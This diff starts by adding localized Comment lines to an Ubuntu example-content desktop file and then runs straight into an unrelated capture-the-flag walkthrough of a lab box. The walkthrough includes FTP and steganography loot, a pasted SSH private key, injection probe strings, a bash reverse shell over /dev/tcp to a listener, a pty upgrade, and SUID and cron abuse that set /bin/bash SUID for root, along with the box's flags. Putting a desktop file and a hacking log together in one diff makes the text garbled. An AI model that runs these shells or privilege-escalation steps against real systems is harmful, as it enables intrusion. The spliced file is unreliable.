@@ -672,3 +672,677 @@ Name[zh_CN]=示例
 Name[zh_HK]=範例
 Name[zh_TW]=範例
 Comment=Example content for Ubuntu
+Comment[aa]=Ubuntuh addattinoh ceelallo
+Comment[ace]=Contoh aso ke Ubuntu
+Comment[af]=Voorbeeld inhoud vir Ubuntu
+Comment[am]=ዝርዝር ምሳሌዎች ለ ኡቡንቱ
+Comment[an]=Conteniu d'exemplo ta Ubuntu
+Comment[ar]=أمثلة محتوى لأوبونتو
+Comment[ast]=Conteníu del exemplu pa Ubuntu
+Comment[az]=Ubuntu üçün nümunə material
+Comment[be]=Узоры дакументаў для Ubuntu
+Comment[bg]=Примерно съдържание за Ubuntu
+Comment[bn]=উবুন্টু সংক্রান্ত নমুনা তথ্য
+Comment[br]=Skouerenn endalc'had evit Ubuntu
+Comment[bs]=Primjer sadrzaja za Ubuntu
+Comment[ca]=Continguts d'exemple per a l'Ubuntu
+Comment[ca@valencia]=Continguts d'exemple per a l'Ubuntu
+Comment[ckb]=نموونەی ناوەڕۆکێک بۆ ئوبوونتو
+Comment[cs]=Ukázkový obsah pro Ubuntu
+Comment[csb]=Przëmiôrowô zamkłosc dlô Ubuntu
+Comment[cy]=Cynnwys enghraifft ar gyfer  Ubuntu
+Comment[da]=Eksempel indhold til Ubuntu
+Comment[de]=Beispielinhalt für Ubuntu
+Comment[dv]=އުބުންޓު އާއި އެކަށޭނަ މިސާލުތައް
+Comment[el]=Παραδείγματα περιεχομένου για το Ubuntu
+Comment[en_AU]=Example content for Ubuntu
+Comment[en_CA]=Example content for Ubuntu
+Comment[en_GB]=Example content for Ubuntu
+Comment[eo]=Ekzempla enhavo por Ubuntu
+Comment[es]=Contenido de ejemplo para Ubuntu
+Comment[et]=Ubuntu näidisfailid
+Comment[eu]=Adibidezko edukia Ubunturako
+Comment[fa]=محتویات نمونه برای اوبونتو
+Comment[fi]=Esimerkkisisältöjä Ubuntulle
+Comment[fil]=Halimbawang laman para sa Ubuntu
+Comment[fo]=Dømis innihald fyri Ubuntu
+Comment[fr]=Contenu d'exemple pour Ubuntu
+Comment[fur]=Contignûts di esempli par Ubuntu
+Comment[fy]=Foarbyld fan ynhâld foar Ubuntu
+Comment[ga]=Inneachar samplach do Ubuntu
+Comment[gd]=Eisimpleir de shusbaint airson Ubuntu
+Comment[gl]=Contido do exemplo para Ubuntu
+Comment[gu]=Ubuntu માટે ઉદાહરણ સૂચી
+Comment[gv]=Stoo Sanpleyr son Ubuntu
+Comment[he]=תוכן לדוגמה עבור אובונטו
+Comment[hi]=उबुन्टू हेतु उदाहरण सारांश
+Comment[hr]=Primjeri sadržaja za Ubuntu
+Comment[ht]=Kontni egzanplè pou Ubuntu
+Comment[hu]=Mintatartalom Ubuntuhoz
+Comment[hy]=Բովանդակության օրինակները Ubuntu֊ի համար
+Comment[id]=Contoh isi bagi Ubuntu
+Comment[is]=Sýnishorn fyrir Ubuntu
+Comment[it]=Contenuti di esempio per Ubuntu
+Comment[ja]=Ubuntuのサンプルコンテンツ
+Comment[ka]=უბუნტუს სანიმუშო შიგთავსი
+Comment[kk]=Ubuntu құжаттар мысалдары
+Comment[kl]=Ubuntu-mut imarisaanut assersuut
+Comment[km]=ឧទាហរណ៍សម្រាប់អាប់ប៊ុនធូ
+Comment[kn]=ಉಬುಂಟುಗೆ ಉದಾಹರಣೆಗಳು
+Comment[ko]=우분투 컨텐츠 예시
+Comment[ku]=Ji bo Ubuntu mînaka naverokê
+Comment[ky]=Ubuntu-нун мисал документтери
+Comment[lb]=Beispillinhalt fir Ubuntu
+Comment[lt]=Įvairių dokumentų, paveikslėlių, garsų bei vaizdų pavyzdžiai
+Comment[lv]=Parauga saturs Ubuntu videi
+Comment[mg]=Ohatra ho an'i Ubuntu
+Comment[mhr]=Ubuntu-лан документ-влакын пример-влак
+Comment[mi]=Mata tauira o Ubuntu
+Comment[mk]=Пример содржина за Убунту
+Comment[ml]=ഉബുണ്ടുവിനു വേണ്ടിയുള്ള ഉദാഹരണങ്ങള്‍
+Comment[mr]=उबंटूसाठी घटकांची उदाहरणे
+Comment[ms]=Kandungan contoh untuk Ubuntu
+Comment[my]=Ubuntu အတွက် နမူနာ မာတိကာ
+Comment[nb]=Eksempelinnhold for Ubuntu
+Comment[ne]=उबन्टुका लागि उदाहरण सामग्री
+Comment[nl]=Voorbeeldinhoud voor Ubuntu
+Comment[nn]=Eksempelinnhald for Ubuntu
+Comment[nso]=Mohlala wa dikagare tša Ubuntu
+Comment[oc]=Exemples de contengut per Ubuntu
+Comment[pa]=ਉਬਤੂੰ ਲਈ ਨਮੂਨਾ ਸਮੱਗਰੀ
+Comment[pl]=Przykładowa zawartość dla Ubuntu
+Comment[pt]=Conteúdo de exemplo para o Ubuntu
+Comment[pt_BR]=Exemplo de conteúdo para Ubuntu
+Comment[ro]=Conținut exemplu pentru Ubuntu
+Comment[ru]=Примеры документов для Ubuntu
+Comment[sc]=Esempiu de cabidu pro Ubuntu
+Comment[sco]=Example content fur Ubuntu
+Comment[sd]=اوبنٽو لاءِ مثال طور ڏنل مواد
+Comment[shn]=တူဝ်ႇယၢင်ႇလမ်းၼႂ်း တႃႇ Ubuntu
+Comment[si]=උබුන්ටු සඳහා උදාහරණ අන්තර්ගතයන්
+Comment[sk]=Ukážkový obsah pre Ubuntu
+Comment[sl]=Ponazoritvena vsebina za Ubuntu
+Comment[sml]=Saupama Isina Ubuntu
+Comment[sn]=Muyenzaniso wehuiswa kuitira Ubuntu
+Comment[sq]=Shembull i përmbajtjes për Ubuntu
+Comment[sr]=Садржај примера за Убунту
+Comment[sv]=Exempelinnehåll för Ubuntu
+Comment[sw]=Bidhaa mfano ya Ubuntu
+Comment[szl]=Bajszpilnŏ treść dlŏ Ubuntu
+Comment[ta]=உபுண்டுவிற்கான எடுத்துகாட்டு உள்ளடக்கங்கள்
+Comment[ta_LK]=உபுண்டுவிற்கான எடுத்துகாட்டு உள்ளடக்கங்கள்
+Comment[te]=Ubuntu వాడుక విధాన నమూనాలు
+Comment[tg]=Мӯҳтавои намунавӣ барои Ubuntu
+Comment[th]=ตัวอย่างข้อมูลสำหรับ Ubuntu
+Comment[tr]=Ubuntu için örnek içerik
+Comment[tt]=Ubuntu өчен документ мисаллары
+Comment[ug]=ئۇبۇنتۇنىڭ مىساللىرى
+Comment[uk]=Приклади контенту для Ubuntu
+Comment[ur]=یوبنٹو کیلئے مثالی مواد
+Comment[uz]=Ubuntu учун намуна таркиби
+Comment[vec]=Contenuti de esempio de Ubuntu
+Comment[vi]=Mẫu ví dụ cho Ubuntu
+Comment[wae]=D'Ubuntu bischbildatijä
+Comment[zh_CN]=Ubuntu 示例内容
+Comment[zh_HK]=Ubuntu 的範例內容
+Comment[zh_TW]=Ubuntu 的範例內容
+URL=file:///usr/share/example-content/
+Icon=folder
+X-Ubuntu-Gettext-Domain=example-content
+
+ftp> 
+
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> ls -lah
+229 Entering Extended Passive Mode (|||18039|).
+150 Here comes the directory listing.
+dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 .
+dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
+drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 files
+226 Directory send OK.
+ftp> cd files
+250 Directory successfully changed.
+ftp> ls -lah
+229 Entering Extended Passive Mode (|||14543|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 Jul 28  2020 .
+dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ..
+-rw-r--r--    1 1001     1001         8183 Jul 28  2020 cool.jpeg
+
+ftp> put user.jpg
+local: user.jpg remote: user.jpg
+229 Entering Extended Passive Mode (|||56190|).
+550 Permission denied.
+
+226 Directory send OK.
+ftp> get cool.jpeg
+local: cool.jpeg remote: cool.jpeg
+229 Entering Extended Passive Mode (|||43318|).
+150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
+100% |**************************************|  8183       96.13 KiB/s    00:00 ETA
+226 Transfer complete.
+8183 bytes received in 00:00 (30.45 KiB/s)
+ftp> exit
+221 Goodbye.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ stegseek cool.jpeg /usr/share/wordlists/rockyou.txt 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "p@55w0rd"       
+
+[i] Original filename: "out.txt".
+[i] Extracting to "cool.jpeg.out".
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat cool.jpeg.out 
+zcv:p1fd3v3amT@55n0pr
+/bobs_safe_for_stuff
+
+http://10.10.209.198:445/bobs_safe_for_stuff
+
+Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
+- youmayenter
+
+10.10.209.198:445
+Bob, I swear to goodness, if you can't remember p@55w0rd 
+It's not that hard
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gobuster dir -u http://10.10.209.198:445/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.209.198:445/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/user                 (Status: 200) [Size: 3401]
+/server-status        (Status: 403) [Size: 294]
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 blog_rsa               
+                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i blog_rsa bob@10.10.209.198
+Load key "blog_rsa": error in libcrypto
+bob@10.10.209.198's password: 
+
+but who is the user
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gobuster dir -u http://10.10.209.198:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.209.198:8080/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/blog                 (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/login                (Status: 200) [Size: 546]
+/review               (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog2                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog1                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog3                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog4                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog5                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+/blog6                (Status: 302) [Size: 219] [--> http://10.10.209.198:8080/login]
+
+vigenere decoder
+
+https://cyberchef.io/#recipe=Vigen%C3%A8re_Decode('youmayenter')&input=emN2OnAxZmQzdjNhbVRANTVuMHBy
+
+bob:d1ff3r3ntP@55w0rd
+
+http://10.10.209.198:8080/login
+
+http://10.10.209.198:8080/blog1
+
+My first blog post! Yay!
+
+http://10.10.209.198:8080/blog2
+
+I should probably actually put something this time... eh I don't wanna, I'll get to it later! 
+
+http://10.10.209.198:8080/blog3
+
+I like dogs and cats. But dogs are better. 
+
+http://10.10.209.198:8080/blog4
+
+If you couldn't tell I also like cupcakes 
+
+http://10.10.209.198:8080/blog5
+
+I'm not sure I like blogging so much anymore. 
+
+http://10.10.209.198:8080/blog6
+
+I'm done with this! I hate blogging! 
+
+http://10.10.209.198:8080/blog0
+
+Not Found
+
+http://10.10.209.198:8080/review
+
+This is the best blog I've ever read! I wanna be you <3 
+
+https://twitter.com/theXSSrat/status/1612122763627724800?lang=es
+
+'"`><img src=x>${{7*7}} Throw this into EVERY parameter you see :D
+
+'"`  SQLi testing 
+'"` JS inject 
+'"`>  html tag attribute inject 
+<img src=x> html inject 
+${{7*7}} CSTI
+
+http://10.10.209.198:8080/review
+
+<h1>ho</h1>
+
+OS command injection
+
+id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+revshell
+
+/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.209.198] 33262
+bash: cannot set terminal process group (534): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bobloblaw-VirtualBox:~/html2$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+</bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@bobloblaw-VirtualBox:~/html2$ You haven't rooted me yet? Jeez
+
+cat /etc/passwd | grep '/bin/bash'
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+bobloblaw:x:1000:1000:bobloblaw,,,:/home/bobloblaw:/bin/bash
+bob:x:1001:1001:,,,:/home/bob:/bin/bash
+
+cat /etc/crontab
+```
+```text
+# /etc/crontab: system-wide crontab
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+## Privilege Escalation
+```text
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
+
+find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/arping
+/usr/bin/blogFeedback
+/usr/bin/passwd
+/bin/ntfs-3g
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/umount
+/opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient
+
+/usr/bin/blogFeedback
+
+www-data@bobloblaw-VirtualBox:~/html2$ cd /var/www
+cd /var/www
+www-data@bobloblaw-VirtualBox:~$ ls
+ls
+html  html2  html4  reno2.jpg  reno.jpg
+www-data@bobloblaw-VirtualBox:~$ You haven't rooted me yet? Jeez
+
+www-data@bobloblaw-VirtualBox:~$ python3 -m http.server
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.8.19.103 - - [01/Sep/2023 13:12:57] "GET /reno.jpg HTTP/1.1" 200 -
+You haven't rooted me yet? Jeez
+10.8.19.103 - - [01/Sep/2023 13:13:08] "GET /reno2.jpg HTTP/1.1" 200 -
+You haven't rooted me yet? Jeez
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.209.198:8000/reno.jpg
+--  http://10.10.209.198:8000/reno.jpg
+Connecting to 10.10.209.198:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 898669 (878K) [image/jpeg]
+Saving to: ‘reno.jpg’
+
+reno.jpg          100%[============>] 877.61K   206KB/s    in 5.2s    
+
+(167 KB/s) - ‘reno.jpg’ saved [898669/898669]
+
+                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.209.198:8000/reno2.jpg
+--  http://10.10.209.198:8000/reno2.jpg
+Connecting to 10.10.209.198:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 440264 (430K) [image/jpeg]
+Saving to: ‘reno2.jpg’
+
+reno2.jpg         100%[============>] 429.95K   258KB/s    in 1.7s    
+
+(258 KB/s) - ‘reno2.jpg’ saved [440264/440264]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ steghide extract -sf reno2.jpg 
+Enter passphrase: 
+wrote extracted data to "doggo.txt".
+                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ steghide extract -sf reno.jpg 
+Enter passphrase: 
+wrote extracted data to "dog.txt".
+                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat dog.txt 
+i'm just a DOG, leave me alone
+                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat doggo.txt 
+jcug xue, paw W's vhooz pxgz Moxhr'y gcm.  Lt O fcaor ikcuvs gqczksx dbopor, L'r vuchdprb pk d fgepow, qac mux xavh lritg o xdphlh nrzk!
+
+https://www.dcode.fr/vigenere-cipher
+
+good job, but I'm still just Jared's dog.  If I could choose another animal, I'd probably be a rabbit, cuz you just found a rabbit hole!
+
+www-data@bobloblaw-VirtualBox:~/html2$ ls -lah /usr/bin/blogFeedback
+ls -lah /usr/bin/blogFeedback
+-rwsrwxr-x 1 bobloblaw bobloblaw 17K Jul 25  2020 /usr/bin/blogFeedback
+
+www-data@bobloblaw-VirtualBox:/usr/bin$ python3 -m http.server 8001
+python3 -m http.server 8001
+Serving HTTP on 0.0.0.0 port 8001 ...
+10.8.19.103 - - [01/Sep/2023 13:31:45] "GET /blogFeedback HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.209.198:8001/blogFeedback       
+--  http://10.10.209.198:8001/blogFeedback
+Connecting to 10.10.209.198:8001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16768 (16K) [application/octet-stream]
+Saving to: ‘blogFeedback’
+
+blogFeedback      100%[============>]  16.38K  90.5KB/s    in 0.2s    
+
+(90.5 KB/s) - ‘blogFeedback’ saved [16768/16768]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ghidra 
+
+undefined8 main(int param_1,long param_2)
+
+{
+  int iVar1;
+  int local_c;
+  
+  if ((param_1 < 7) || (7 < param_1)) {
+    puts("Order my blogs!");
+  }
+  else {
+    for (local_c = 1; local_c < 7; local_c = local_c + 1) {
+      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
+      if (iVar1 != 7 - local_c) {
+        puts("Hmm... I disagree!");
+        return 0;
+      }
+    }
+    puts("Now that, I can get behind!");
+    setreuid(1000,1000);
+    system("/bin/sh");
+  }
+  return 0;
+}
+
+www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 1 2 3 4
+blogFeedback 1 2 3 4
+Order my blogs!
+www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 1 2 3 4 5 6
+blogFeedback 1 2 3 4 5 6
+Hmm... I disagree!
+
+www-data@bobloblaw-VirtualBox:/usr/bin$ blogFeedback 6 5 4 3 2 1
+blogFeedback 6 5 4 3 2 1
+Now that, I can get behind!
+```
+```text
+$ whoami
+whoami
+bobloblaw
+```
+```text
+$ cd bobloblaw
+cd bobloblaw
+```
+```text
+$ ls
+ls
+Desktop    Downloads	     Music     Public	  Videos
+Documents  examples.desktop  Pictures  Templates
+```
+```text
+$ cd Desktop
+cd Desktop
+```
+```text
+$ You haven't rooted me yet? Jeez
+ls
+ls
+dontlookatthis.jpg  lookatme.jpg  user.txt
+```
+```text
+$ cat user.txt
+cat user.txt
+THM{C0NGR4t$_g3++ing_this_fur}
+
+@jakeyee thank you so so so much for the help with the foothold on the box!!
+
+cd ../Documents
+```
+```text
+$ ls
+ls
+```
+```text
+$ ls -lah
+ls -lah
+total 16K
+drwxr-xr-x  3 bobloblaw bobloblaw 4.0K Jul 30  2020 .
+drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 ..
+drwxrwx---  2 bobloblaw bobloblaw 4.0K Sep  1 13:43 .also_boring
+-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
+```
+```text
+$ You haven't rooted me yet? Jeez
+cat .boring_file.c
+cat .boring_file.c
+#include <stdio.h>
+int main() {
+	printf("You haven't rooted me yet? Jeez\n");
+	return 0;
+
+}
+
+replace 
+
+#include <stdlib.h>
+
+int main(){
+    system("chmod +s /bin/bash");
+    return 0;
+}
+
+cat << EOF > /home/bobloblaw/Documents/.boring_file.c
+#include <stdlib.h>
+int main(){
+ system("chmod +s /bin/bash");
+ return 0;
+}
+EOF
+
+1. `<stdio.h>`: The first program uses functions like `printf` to display a message. `<stdio.h>` is included because it contains the necessary declarations for these functions.
+    
+2. `<stdlib.h>`: The second program uses the `system` function, which is declared in `<stdlib.h>`. The `system` function allows you to execute shell commands
+
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ cat .boring_file.c
+cat .boring_file.c
+#include <stdlib.h>
+int main(){
+ system("chmod +s /bin/bash");
+ return 0;
+}
+
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ ls -lah /bin/bash
+ls -lah /bin/bash
+-rwxr-xr-x 1 root root 1.1M Nov 15  2016 /bin/bash
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ ls -lah /bin/bash
+ls -lah /bin/bash
+-rwsr-sr-x 1 root root 1.1M Nov 15  2016 /bin/bash
+
+bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$ bash -p
+bash -p
+bash-4.4# cd /root
+cd /root
+bash-4.4# ls
+ls
+root.txt
+bash-4.4# cat root.txt
+cat root.txt
+THM{G00D_J0B_G3++1NG+H3R3!}
+
+┌──(witty㉿kali)-[~/bug_hunter]
+└─$ git clone https://github.com/NitinYadav00/Bug-Bounty-Search-Engine.git
+Cloning into 'Bug-Bounty-Search-Engine'...
+remote: Enumerating objects: 42, done.
+remote: Counting objects: 100% (42/42), done.
+remote: Compressing objects: 100% (38/38), done.
+remote: Total 42 (delta 17), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (42/42), 16.05 MiB | 12.27 MiB/s, done.
+Resolving deltas: 100% (17/17), done.
+
+┌──(witty㉿kali)-[~/bug_hunter/Bug-Bounty-Search-Engine]
+└─$ firefox index.html
+```
+![[Pasted image 20230901111539.png]]
+![[Pasted image 20230901112603.png]]
+User Flag
+Root Flag
+
+## Flags / Answers
+- ***THM{C0NGR4t$_g3++ing_this_fur}***
+- ***THM{G00D_J0B_G3++1NG+H3R3!}***
+
+## Notes / Lessons Learned
